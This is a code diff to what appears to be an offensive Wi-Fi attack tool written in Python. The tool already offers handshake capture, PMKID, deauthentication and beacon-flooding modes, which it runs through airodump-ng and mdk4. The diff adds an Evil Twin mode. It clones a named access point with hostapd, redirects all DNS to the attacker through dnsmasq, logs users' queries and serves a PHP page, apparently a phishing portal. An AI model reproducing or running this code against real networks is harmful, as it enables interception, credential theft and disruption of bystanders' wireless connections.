@@ -75,6 +75,7 @@ def menu_panel():
     get_colours(f"\t PKMID", "blue")
     get_colours(f"\t DAuth (Deauthentication attack)", "blue")
     get_colours(f"\t BFlood (Beacon flooding attack)", "blue")
+    get_colours(f"\t ETwin (Evil Twin attack) (working on it)", "blue")
     print("")
     print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-h]'}{Fore.YELLOW + ' Help Panel'}")
     print(Fore.WHITE)  # To avoid leaving the terminal with colors.
@@ -214,7 +215,7 @@ def attack_func(network_interface, attack_mode):
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
         # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
         access_name = input(Fore.YELLOW + "Access point name: ")
-        access_channel = input(Fore.YELLOW + "Channel name: ")
+        access_channel = input(Fore.YELLOW + "Channel number: ")
         time.sleep(1)
         get_colours("\n[*] Setting up things...", 'cyan')
         try:
@@ -309,7 +310,7 @@ def attack_func(network_interface, attack_mode):
         subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
         process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
         access_name = input(Fore.YELLOW + "Access point name: ")
-        access_channel = input(Fore.YELLOW + "Channel name: ")
+        access_channel = input(Fore.YELLOW + "Channel number: ")
         attack_time = input(Fore.YELLOW + "Time for the attack (seconds): ")
         time.sleep(1)
         get_colours("\n[*] Setting up things...", 'cyan')
@@ -359,7 +360,56 @@ def attack_func(network_interface, attack_mode):
         os.system(
             f"xterm -hold -e sudo mdk4 {network_interface}mon b -s 950")
         quit_program()
+    # Evil Twin Attack
+    elif attack_mode == "ETwin":
+        script_banner()
+        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
+        access_name = input(Fore.YELLOW + "Access point name: ")
+        access_channel = input(Fore.YELLOW + "Channel number: ")
+        set_hostapd = f"""
+        interface={network_interface}mon
+        driver=nl80211
+        ssid={access_name}
+        hw_mode=g
+        channel={access_channel}
+        macaddr_acl=0
+        ignore_broadcast_ssid=0
+        """
+        set_dnsmasq = f""" 
+        interface={network_interface}mon
+        dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h
+        dhcp-option=3, 192.168.1.1
+        dhcp-option=6, 192.168.1.1
+        server=8.8.8.8
+        log-queries
+        log-dhcp
+        listen-address=127.0.0.1
+        address=/#/192.168.1.1
+        """
+        # Saving HOSTAPD config
+        hostapd_config = open("wifi_hostapd.conf", "w+")
+        hostapd_config.write(set_hostapd)
+        hostapd_config.close()
 
+        # Saving DNSMASQ config
+        dnsmasq_config = open('wifi_dnsmasq.conf', 'w+')
+        dnsmasq_config.write(set_dnsmasq)
+        dnsmasq_config.close()
+        # Adding routes
+        subprocess.run([f"ifconfig {network_interface}mon up 192.168.1.1 netmask 255.255.255.0"], shell=True)
+        subprocess.run(["route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1"], shell=True)
+        # get PWD
+        get_pwd = subprocess.check_output(["pwd"]).decode().strip()
+        # Start HOSTAPD
+        time.sleep(2)
+        os.system(f"xterm -hold -e sudo hostapd {get_pwd}/wifi_hostapd.conf &")
+        # Start DNSMASQ
+        time.sleep(2)
+        os.system(f"xterm -hold -e sudo dnsmasq -C {get_pwd}/wifi_dnsmasq.conf -d &")
+        # Starting the PHP server
+        time.sleep(3)
+        os.system(f"xterm -hold -e sudo php -S 192.168.1.1:80")
+        quit_program()
 
 def quit_program():
     time.sleep(2)
@@ -384,7 +434,7 @@ def check_parms():
                         if len(sys.argv) > 4:
                             check_interface_exist = subprocess.check_output("ip a | grep '%s' | awk '{print $2}' | grep"
                                                                             " '%s' | awk '{print $1}' FS=':'" % (
-                                                                            sys.argv[2], sys.argv[2]),
+                                                                                sys.argv[2], sys.argv[2]),
                                                                             shell=True).decode().strip()
                             check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood"]
                             if sys.argv[2] != check_interface_exist:
@@ -395,7 +445,7 @@ def check_parms():
                                 print(f"\n{Fore.BLUE + '┃'} {Fore.YELLOW + ' Available interfaces are:'}\n")
                                 cnt = 1
                                 for i in save_all:
-                                    print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt) }.{Fore.YELLOW + f' {i}'}")
+                                    print(f"{Fore.RED + '┃'} {Fore.BLUE + str(cnt)}.{Fore.YELLOW + f' {i}'}")
                                     cnt = cnt + 1
                             elif sys.argv[4] not in check_attack_mode:
                                 print(f"\n{Fore.BLUE + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
@@ -404,6 +454,7 @@ def check_parms():
                                 print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
                                 print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
                                 print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
+                                print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
                                 print(Fore.WHITE)
                             else:
                                 check_deps()  # Check for necessary program to run this script.
@@ -414,6 +465,7 @@ def check_parms():
                             print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
                             print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
                             print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
+                            print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
                             print(Fore.WHITE)
                     else:
                         print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
@@ -426,6 +478,7 @@ def check_parms():
                     print(f"{Fore.RED + '┃'} {Fore.YELLOW + '2. PKMID'}")
                     print(f"{Fore.RED + '┃'} {Fore.YELLOW + '3. DAuth'}")
                     print(f"{Fore.RED + '┃'} {Fore.YELLOW + '4. BFlood'}")
+                    print(f"{Fore.RED + '┃'} {Fore.YELLOW + '5. ETwin'}")
                     print(Fore.WHITE)
             else:
                 print(f"\n{Fore.RED + '┃'}  {Fore.GREEN + '['}{Fore.RED + '!'}{Fore.GREEN + '] '}"
